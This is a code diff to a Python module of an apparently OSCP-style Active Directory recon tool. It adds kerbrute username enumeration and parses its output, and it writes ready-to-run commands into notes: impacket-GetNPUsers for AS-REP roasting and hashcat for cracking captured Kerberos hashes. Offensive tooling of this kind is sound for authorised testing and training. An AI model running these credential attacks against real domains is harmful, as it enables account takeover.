@@ -5,8 +5,8 @@ Calls wrappers/ldap_enum.sh, then parses the output files to update
 session.info with discovered users, computers, base DN, and domain info.
 
 OSCP routing logic:
+  - Port 88 (Kerberos) → DC detection; kerbrute username enumeration
   - Port 389 or 636 → LDAP anonymous + authenticated enum
-  - Port 88 (Kerberos) → detect DC, print manual AS-REP/Kerberoast hints
   - Port 3268/3269 → Global Catalog (AD forest-wide queries)
 
 Credentials: pulled from session.info if available.
@@ -17,6 +17,8 @@ import re
 from pathlib import Path
 
 from core.runner import run_wrapper
+from rich.console import Console
+from rich.panel import Panel
 
 WRAPPERS_DIR = Path(__file__).resolve().parent.parent / "wrappers"
 
@@ -90,6 +92,13 @@ def run(target: str, session, dry_run: bool = False) -> None:
     # Print manual hints if Kerberos is open and we found users
     if kerb_open and session.info.users_found:
         _print_kerberos_hints(ldap_dir, session, log)
+
+    # Parse kerbrute output — integrates confirmed usernames into session state
+    # and surfaces them in notes.md for immediate AS-REP Roasting follow-up.
+    _parse_kerbrute_output(ldap_dir, session, log)
+
+    # Check whether the kill-chain fired and hashes were captured
+    _check_asreproast_hashes(ldap_dir, session, log)
 
     log.info("LDAP module complete.")
 
@@ -183,9 +192,123 @@ def _print_kerberos_hints(ldap_dir: Path, session, log) -> None:
         domain, target,
     )
     session.add_note(
-        f"MANUAL: AS-REP Roasting — "
+        f"💡 AS-REP Roasting — "
         f"impacket-GetNPUsers {domain}/ -dc-ip {target} -no-pass "
         f"-usersfile {users_file}"
     )
+
+
+def _parse_kerbrute_output(ldap_dir: Path, session, log) -> None:
+    """
+    Parse kerbrute userenum output to extract Kerberos-confirmed usernames.
+
+    kerbrute writes two artefacts:
+      ldap/kerbrute_users.txt      — structured output from --output flag
+      ldap/kerbrute_users.txt.log  — full tee'd stdout (richer format)
+
+    Both files use the same line format for valid accounts:
+        <timestamp> >  [+] VALID USERNAME:       user@domain.com
+
+    Only the username part (before @) is extracted — domain suffix is
+    redundant since session.info.domain already holds it.
+
+    Confirmed usernames are merged into session.info.users_found (de-duped)
+    and the AS-REP Roasting manual command is injected as a 💡 note so the
+    operator can copy-paste it immediately from notes.md.
+    """
+    kerb_out = ldap_dir / "kerbrute_users.txt"
+    if not kerb_out.exists() or kerb_out.stat().st_size == 0:
+        return
+
+    confirmed: list = []
+    for line in kerb_out.read_text(errors="ignore").splitlines():
+        # kerbrute format: "... [+] VALID USERNAME:       user@domain.com"
+        m = re.search(
+            r'VALID USERNAME:\s+([A-Za-z0-9_\.\-]+)(?:@\S+)?',
+            line, re.IGNORECASE,
+        )
+        if not m:
+            continue
+        user = m.group(1).strip()
+        if user and user not in session.info.users_found:
+            session.info.users_found.append(user)
+            confirmed.append(user)
+            log.info("kerbrute confirmed valid user: %s", user)
+
+    if not confirmed:
+        log.info("kerbrute output parsed — no new usernames added")
+        return
+
+    domain = session.info.domain or "<DOMAIN>"
+    target = session.info.ip
+
+    log.info(
+        "kerbrute: %d new confirmed user(s) added to session: %s",
+        len(confirmed), confirmed[:10],
+    )
+    session.add_note(
+        f"✅ kerbrute validated {len(confirmed)} user(s) via Kerberos: "
+        f"{', '.join(confirmed[:20])}"
+        + (f" ... and {len(confirmed) - 20} more" if len(confirmed) > 20 else "")
+    )
+    # Inject ready-to-run AS-REP Roasting command so the operator can act
+    # immediately — marked 💡 so finalize_notes() surfaces it in the
+    # "Manual Follow-Up Commands" section of notes.md.
+    session.add_note(
+        f"💡 AS-REP Roast confirmed users: "
+        f"impacket-GetNPUsers {domain}/ -dc-ip {target} -no-pass "
+        f"-usersfile {ldap_dir / 'ldap_users.txt'} "
+        f"-outputfile {ldap_dir / 'asrep_hashes.txt'}"
+    )
+
+
+def _check_asreproast_hashes(ldap_dir: Path, session, log) -> None:
+    """
+    Check whether the kill-chain wrapper captured AS-REP hashes.
+
+    If asreproast.hashes exists and has content, fire a RED ALERT panel
+    to the terminal and record the hashes in session state so advisor.py
+    can emit the exact crack command.
+    """
+    hash_file = ldap_dir / "asreproast.hashes"
+    if not hash_file.exists() or hash_file.stat().st_size == 0:
+        return
+
+    lines = [l for l in hash_file.read_text(errors="ignore").splitlines()
+             if l.startswith("$krb5asrep$")]
+    if not lines:
+        return
+
+    hash_count = len(lines)
+    log.warning("AS-REP HASHES CAPTURED: %d hash(es) in %s", hash_count, hash_file)
+
+    # Mark on session so advisor.py knows hashes exist
+    session.info.ntlm_hashes_found = True  # reuse existing flag — triggers PTH section too
+    # Store path so advisor.py can reference the exact file
+    if not hasattr(session.info, "asreproast_hash_file"):
+        session.info.asreproast_hash_file = str(hash_file)
+
+    session.add_note(
+        f"🔴 AS-REP HASHES CAPTURED ({hash_count} hash(es)) → {hash_file}\n"
+        f"   hashcat -m 18200 {hash_file} /usr/share/wordlists/rockyou.txt "
+        f"-r /usr/share/john/rules/best64.rule"
+    )
+
+    console = Console()
+    console.print()
+    console.print(
+        Panel(
+            f"[bold white]{hash_count} AS-REP HASH(ES) CAPTURED[/bold white]\n\n"
+            f"[bold yellow]File:[/bold yellow] [cyan]{hash_file}[/cyan]\n\n"
+            f"[bold yellow]Crack now:[/bold yellow]\n"
+            f"[bold white]hashcat -m 18200 {hash_file} \\\n"
+            f"    /usr/share/wordlists/rockyou.txt \\\n"
+            f"    -r /usr/share/john/rules/best64.rule[/bold white]",
+            title="[bold red blink] !!!  AS-REP ROAST — HASHES ON DISK  !!! [/bold red blink]",
+            border_style="bold red",
+            padding=(1, 4),
+        )
+    )
+    console.print()
 
 
